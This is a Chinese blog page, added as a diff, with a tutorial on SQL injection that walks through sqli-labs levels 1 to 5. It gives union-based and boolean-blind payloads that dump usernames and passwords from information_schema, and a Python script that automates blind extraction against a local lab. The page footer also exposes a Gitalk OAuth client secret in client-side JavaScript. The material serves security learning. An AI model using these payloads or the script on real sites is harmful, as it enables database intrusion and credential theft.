@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>解锁SQL注入技能1 | 13m0nade&#39;s blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sql注入,">
+  
+
+  <meta name="description" content="解锁SQL注入技能(1) nullSQL注入基本流程 1)首先测试正常数据，如?id=1 2)判断是否存在注入点，如在?id=1+【‘】、【and 1=1】或【and 1=2】 3)判断字段长度,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 # 4)判断字段回显位置，如在?id=1+【‘】+【">
+<meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="解锁SQL注入技能1">
+<meta property="og:url" content="https://13m0nade.github.io/2019/08/06/解锁SQL注入技能1/index.html">
+<meta property="og:site_name" content="13m0nade&#39;s blog">
+<meta property="og:description" content="解锁SQL注入技能(1) nullSQL注入基本流程 1)首先测试正常数据，如?id=1 2)判断是否存在注入点，如在?id=1+【‘】、【and 1=1】或【and 1=2】 3)判断字段长度,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 # 4)判断字段回显位置，如在?id=1+【‘】+【">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-06T08:28:58.922Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="解锁SQL注入技能1">
+<meta name="twitter:description" content="解锁SQL注入技能(1) nullSQL注入基本流程 1)首先测试正常数据，如?id=1 2)判断是否存在注入点，如在?id=1+【‘】、【and 1=1】或【and 1=2】 3)判断字段长度,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 # 4)判断字段回显位置，如在?id=1+【‘】+【">
+
+  
+
+  
+    <link rel="icon" href="/images/lemonade.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-text">解锁SQL注入技能(1)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入基本流程"><span class="toc-text">nullSQL注入基本流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始cxk式操作"><span class="toc-text">null开始CXK式操作</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-解锁SQL注入技能1" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">解锁SQL注入技能1</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.08.06</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>13m0nade</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/web安全/">web安全</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1>解锁SQL注入技能(1)</h1>
+<h2 id="sql注入基本流程"><a class="header-anchor" href="#sql注入基本流程">null</a>SQL注入基本流程</h2>
+<p>1)<strong>首先测试正常数据</strong>，如?id=1</p>
+<p>2)<strong>判断是否存在注入点</strong>，如在?id=1+【‘】、【and 1=1】或【and 1=2】</p>
+<p>3)<strong>判断字段长度</strong>,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 #</p>
+<p>4)<strong>判断字段回显位置</strong>，如在?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</p>
+<p>5)<strong>判断数据库信息</strong>：<br>
+利用内置函数暴数据库信息<br>
+version()版本；database()数据库；user()用户；<br>
+不用猜解可用字段暴数据库信息(有些网站不适用):<br>
+and 1=2 union all select version()<br>
+and 1=2 union all select database()<br>
+and 1=2 union all select user()<br>
+操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user<br>
+数据库权限：<br>
+and ord(mid(user(),1,1))=114返回正常说明为root</p>
+<p>6)<strong>查找数据库名</strong><br>
+Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息union select information_schema from information_schema.schemata （语句在显示位）</p>
+<p>7)<strong>查找数据库表名</strong><br>
+union select group_concat(table_name) from information_schema.tables where table_schema=database()</p>
+<p>8)<strong>查找列名</strong><br>
+union select group_concat(column_name) from information_schema.columns where table_name=‘users’ --+</p>
+<p>9)<strong>获取值</strong><br>
+union select group_concat(username,password) from users–+<br>
+或者1’ union select 1,(select 列名 from 表名),3,4#</p>
+<p>10)<strong>查找数据库表中所有字段以及字段值</strong><br>
+and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</p>
+<p><strong>判断是否存在注入点</strong><br>
+?id=100’ 返回错误说明有可能注入<br>
+?id=100 and 1=1 返回正常<br>
+?id=100 and 1=2返回错误</p>
+<h2 id="开始cxk式操作"><a class="header-anchor" href="#开始cxk式操作">null</a>开始CXK式操作</h2>
+<p><strong>平台：sqli-labs</strong></p>
+<p><strong>工具：firefox，hackbar</strong></p>
+<p><strong>LV1</strong></p>
+<p>根据名字可知，第一关为基于报错的单引号字符型注入（后续将给出判断过程）。</p>
+<ol>
+<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1&quot;，是单引号型注入，使用–+注释后页面回显正常。</li>
+<li>使用order by判断字段长度，order by 4时出现报错，3时回显正常，所以字段长度为3.</li>
+<li>使用?id=0’union select 1,2,group_concat(schema_name) from information_schema.schemata --+来查找数据库名（id要为不存在的字段，好让第一句结果为空，直接显示第二句的结果）</li>
+<li>使用?id=0’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= ‘security’–+查询数据库表名</li>
+<li>id=0’union select 1,2,group_concat(column_name) from information_schema.columns where table_name= ‘users’–+查询数据库列名</li>
+<li>使用?id=0’ union select 1 , group_concat(username) ,group_concat(password)from security.users–+爆出username和password</li>
+</ol>
+<p><strong>LV2</strong></p>
+<ol>
+<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right<br>
+syntax to use near ‘’ LIMIT 0,1’ at line 1”可以得到这个sql语句其实并没有单引号，只是用数字进行查询。（或者输入?id=2-1，结果与?id=1相同）</li>
+<li>继续第一关操作，单引号去掉，也不用注释，其它保持不变就行。payload：id=0 union select 1 , group_concat(username) ,group_concat(password)from security.users</li>
+</ol>
+<p><strong>LV3</strong></p>
+<ol>
+<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax check the manual that corresponds to your MariaDB  server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1”，加上)–+后显示正常。</li>
+<li>继续1的操作，只要在引号后加上）即可。   ?id=0’) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</li>
+</ol>
+<p><strong>LV4</strong></p>
+<p>在url后输入?id=1页面回显正常，然后加上‘，页面未报错，输入”页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1“，加上)–+后显示正常。</p>
+<p>继续1的操作，只要在双引号后加上）即可。  ?id=0&quot;) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</p>
+<p><strong>LV5</strong></p>
+<ol>
+<li>输入?id=1显示显示You are in…,输入‘出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for theright syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 ”，注释后显示You are in…。</li>
+<li>尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回You are in…，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。</li>
+<li><strong>?id=1’</strong>  <strong>and left(version(),1)=5 %23</strong>    查看版本信息</li>
+<li><strong>?id=1’ and length(database())= 8 %23</strong>    判断数据库长度</li>
+<li>猜测数据库名称（从第一位开始猜）：<br>
+1&gt;猜第1位<br>
+?id=1’ and left(database(),1)&gt;‘a’ %23<br>
+返回正常<br>
+?id=1’ and left(database(),1)&gt;‘z’ %23<br>
+返回错误<br>
+说明第一位在a和z之间<br>
+?id=1’ and left(database(),1)&gt;‘s’ %23<br>
+返回正确<br>
+所以第一位是s<br>
+1&gt;猜第2位<br>
+?id=1’ and left(database(),2)&gt;‘sa’ %23<br>
+返回正常<br>
+?id=1’ and left(database(),2)&gt;‘sz’ %23<br>
+返回错误<br>
+说明第二位在a和z之间<br>
+?id=1’ and left(database(),2)&gt;‘se’ %23<br>
+返回正确<br>
+所以第二位是e<br>
+以此类推，直到推出第8位：最后数据库为security</li>
+<li>猜测数据库（security）中的表：<br>
+?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,1)b,1))&gt;n<br>
+说明：<br>
+a是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数</li>
+<li>猜用户：<br>
+?id=1’and ord(mid((select ifnull(cast(username as char),0x20)from S. M order by  id  limit A,1),B,1))=N %23<br>
+其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。</li>
+<li>猜用户和密码：<br>
+?id=1’  and ord(mid((select ifnull(cast(username as char),0x20)from S.Morder by id limit A,1),B,1))=N %23<br>
+其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。<br>
+例：?id=1’  and ord(mid((select ifnull(cast(password as char),0x20)from security.users order by id limit 0,1),1,1))=68 %23</li>
+</ol>
+<p>可直接使用python脚本，具体代码如下（python3）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsurl = <span class="string">'http://127.0.0.1/sqlilabs/Less-5/?id=1'</span>db_length = <span class="number">0</span>db_name = <span class="string">''</span>table_num = <span class="number">0</span>table_len = <span class="number">0</span>table_name = <span class="string">''</span>table_list = []column_num = <span class="number">0</span>column_len = <span class="number">0</span>column_name = <span class="string">''</span>column_list = []dump_num = <span class="number">0</span>dump_len = <span class="number">0</span>dump_name = <span class="string">''</span>dump_list = []i = j = k = <span class="number">0</span><span class="comment">### 当前数据库名长度 ###for i in range(1,20):    db_payload = '''' and (length(database())=%d)--+''' %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if "You are in" in r.text:        db_length = i        print('当前数据库名长度为：%d' % db_length)        break### 当前数据库名 ###print('开始猜解数据库名......')for i in range(1,db_length+1):    for j in range(95,123):        db_payload = '''' and (left(database(),%d)='%s')--+''' % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if "You are in" in r.text:            db_name += chr(j)            # print(db_name)            breakprint('数据库名：\n[+]',db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = '''' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+''' % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if "You are in" in r.text:        table_num = i        breakprint('一共有%d张表' % table_num)print('开始猜解表名......')### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = ''    #### 表名长度 ####    for j in range(1,21):        db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit %d,1),%d,1))--+''' % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if "You are in" not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+''' % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if "You are in" in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint('表名：',table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = '''' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+''' % (        j, i)        r = requests.get(url + db_payload)        if "You are in" in r.text:            column_num = j            print(("[+] 表名：%-10s\t" % i) + str(column_num) + '字段')            break#### 猜解列名长度 ####column_num = 3print('%s表中的列名：' % table_list[-1])for j in range(3):    column_name = ''    for k in range(1,21):        db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))--+''' % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if "You are in" not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))=%d--+''' % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if "You are in" in r.text:                column_name += chr(l)    print('[+] ',column_name)    column_list.append(column_name)print('开始爆破以下字段：',column_list[1:])for column in column_list[1:]:    print(column,'：')    dump_num = 0    for i in range(30):        db_payload = '''' and %d=(select count(%s) from %s.%s)--+''' % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if "You are in" in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = ''        #### 字段长度 ####        for j in range(1, 21):            db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+''' % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if "You are in" not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+''' % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if "You are in" in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print('[+]',dump_name)</span></span><br></pre></td></tr></table></figure>
+<p>因篇幅过长下次更新。。。</p>
+<p>敬请关注：-）</p>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持13m0nade</div>
+        <ul>
+        
+          <li class="item">
+            
+              <span>走过路过不要错过~</span>
+            
+            <img src="/images/alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/07/30/高级PHP应用程序漏洞审核技术/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+<!-- Gitalk评论插件通用代码 -->
+<div id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+const gitalk = new Gitalk({
+  clientID: 'b8bec8da7fe867266b4f',
+  clientSecret: '0976900ab435dd8d57a619325ae34a6ec115b876',
+  repo: 'https://13m0nade.github.io',
+  owner: '13m0nade',
+  // 在这里设置一下截取前50个字符串, 这是因为 github 对 label 的长度有了要求, 如果超过
+  // 50个字符串则会报错.
+  // id: location.pathname.split('/').pop().substring(0, 49),
+  id: location.pathname,
+  admin: ['13m0nade'],
+  // facebook-like distraction free mode
+  distractionFreeMode: false
+})
+gitalk.render('gitalk-container')
+</script>
+<!-- Gitalk代码结束 -->
+
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":150,"height":380},"mobile":{"show":true},"log":false});</script></body>
+</html>
